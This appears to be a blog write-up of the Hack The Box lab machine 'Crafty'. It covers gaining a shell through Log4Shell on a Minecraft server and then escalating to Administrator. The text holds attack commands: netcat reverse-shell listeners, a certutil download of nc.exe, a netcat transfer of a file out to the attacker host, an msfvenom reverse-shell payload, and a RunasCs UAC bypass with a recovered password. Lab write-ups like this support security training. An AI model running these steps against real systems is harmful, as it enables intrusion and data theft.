---
date: 2024-06-12T21:19:39-05:00
# description: ""
image: "/images/HTB-Crafty/Crafty.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Crafty"
type: "post"
---

* Platform: Hack The Box
* Link: [Crafty](https://app.hackthebox.com/machines/Crafty)
* Level: Easy
* OS: Windows
---

Crafty is a Windows Server 2019 running Minecraft 1.16.5, this version is vulnerable to Log4Shell (`CVE-2021-44228`) and after using a PoC of the exploit we gain our initial foothold. On the target system, we find an archive containing some credential that we use to obtain an administrative shell.

Target IP - `10.10.11.249`


## Scanning 

```
sudo nmap -sC -sV -p- -oA nmap/Crafty 10.10.11.249
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.62 seconds
```

We find two open ports:

* 80 running HTTP
* 25565 running a Minecraft server with version 1.16.5

Even though there is no redirection let's add `crafty.htb` to our hosts file.

```
sudo echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

## Enumeration

When we go to the website we find a web page about a game called Crafty.

![Crafty website](/images/HTB-Crafty/crafty-webpage.png)

There is nothing interesting on the web application so we turn our attention to the Minecraft server. When searching `minecraft 1.16.5 vulnerability` we find that there is a Log4j exploit for it with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

> `play.crafty.htb` redirects us to the main website.

![Minecraft Log4j exploit](/images/HTB-Crafty/log4j-Minecraft.png)

We then find a PoC for the exploit at this [Github repo](https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------).

After checking the content of `poc.py` we notice that it is using `String cmd="/bin/sh";` which will not work on Windows. In order to make it Windows compatible we change that line to `String cmd="cmd.exe";`.

![Log4j PoC content](/images/HTB-Crafty/log4j-poc-content.png)

![Log4j PoC content change](/images/HTB-Crafty/poc-python-change.png)

On the exploit page, we read: "**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory."

Going to the website provided on the Github page we are required to create an account. After searching around we find some java archives on https://repo.huaweicloud.com/java/.

For a quick download and setup use the commands below.

```
#Make sure to download it in the log4j-shell-poc directory
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz

#Rename the file
mv jdk1.8.0_181 jdk1.8.0_20
```

## Initial Foothold

Here are all our files.

![Log4j PoC files](/images/HTB-Crafty/log4j-poc-files.png)

We need a way to communicate with the Minecraft server, we will use [pyCraft](https://github.com/ammaraskar/pyCraft) for that. Let's setup a virtual environment for pyCraft.

```
virtualenv ENV

source ENV/bin/activate

pip install -r requirements.txt
```

![PyCraft setup](/images/HTB-Crafty/pyCraft-setup.png)

Now we setup a listener to catch the shell.

```
rlwrap nc -lvnp 4444
```

Then we start the log4j exploit from the `log4j-shell-poc` directory.

```
python3 poc.py --userip <IP_ADDRESS> --webport 80 --lport <PORT_NUMBER>
```

![Log4j exploit launch](/images/HTB-Crafty/crafty-exploit.png)

From the `PyCraft` folder we run `start.py`

```
python3 start.py
```

After the `Connected.` message appears in PyCraft. We copy the link provided on the line starting with `Send me:` in `log4j-shell-poc`, paste it in pyCraft then press `Enter` and we catch a shell on the listener.

![PyCraft](/images/HTB-Crafty/PyCraft-connection-link.png)

> If PyCraft fails to connect to the server, resetting the box should solve the issue.

![svc_minecraft shell](/images/HTB-Crafty/shell-minecraft.png)

The user flag is on the user desktop.

![Crafty user flag](/images/HTB-Crafty/crafty-user-flag.png)

## Privilege Escaltion

In `c:\Users\svc_minecraft\server\plugins\` we find an archive named `playercounter-1.0-SNAPSHOT.jar`.

To send that file to our local machine we use `nc.exe` (Netcat for Windows)

1. Download `nc.exe` with 

```
wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
```

2. Move into the `netcat-1.11` directory created after the extraction

3. Start a web server with Python

```
python3 -m http.server
```

4. We download `nc.exe` on the target

```
certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
```

![netcat upload on target](/images/HTB-Crafty/nc.exe-ontarget.png)

5. On our local machine we run

```
nc -nlp 1235 > playercounter-1.0-SNAPSHOT.jar
```

6. Finally, we send the archive to our Kali machine 

```
.\nc.exe 10.10.14.222 1235 < c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
```

![Crafty archive exfiltration](/images/HTB-Crafty/archive-exfiltration.png)

> Stop the listener to regain control of the terminal on the target system.

After extracting the archive, we get `Playercounter.class` in `/htb/crafty/playercounter/`which we decompile with [decompiler.com](https://www.decompiler.com/).

> A `.class` file is a compiled Java bytecode file. When you compile a Java source code file (`.java`), the Java compiler (`javac`) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in `.class` files. In our case `Playercounter.class` contains the compiled bytecode for the `Playercounter` Java class.

We find what looks like some credential (`s67u84zKq8IXw`) used when connecting to a service on port 27015 (typically used by online games). 

![archive content credentials](/images/HTB-Crafty/playercount-file.png)

We have a tool called [RunasCs](https://github.com/antonioCoco/RunasCs) that enables us to execute processes with permissions different from our current user's. Our objective is to get an Administrator shell from the current user `svc_minecraft`.

Let's generate a payload with `msfvenom`.

**Example**

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=<YOUR IP ADDRESS> lport=<PORT NUMBER> -f exe -a x64 --platform windows -o shell.exe
```

`shell.exe` and `RunasCs.exe` are transferred to the target using the same method employed for `nc.exe`.

![malicious file and runascs.exe on target](/images/HTB-Crafty/files-on-target.png)

We setup another listener on the port selected for the `msfvenom` payload.

```
rlwrap -cAr nc -lvp <PORT_NUMBER>
```

We then use `runasCs` in conjunction with the malicious file.

```
.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
```

We get a connection on the listener, as `administrator`.

![admin shell](/images/HTB-Crafty/admin-shell.png)

At `C:\Users\Administrator\Desktop` we find `root.txt`.

![root flag](/images/HTB-Crafty/root-flag.png)

## Closing Words

Log4j is considered one of the most severe vulnerability because it allows attackers to easily take over vulnerable systems. It is very important to be able to recognize and test for those popular vulnerabilities. If you want to learn more about it, below are a video and an article detailing it:

* [Apache Log4j: The Exploit that Almost Killed the Internet](https://www.youtube.com/watch?v=UhuL11JaECM&ab_channel=IntotheShadows)
* [Log4J Vulnerability Explained: What It Is and How to Fix It](https://builtin.com/articles/log4j-vulerability-explained)
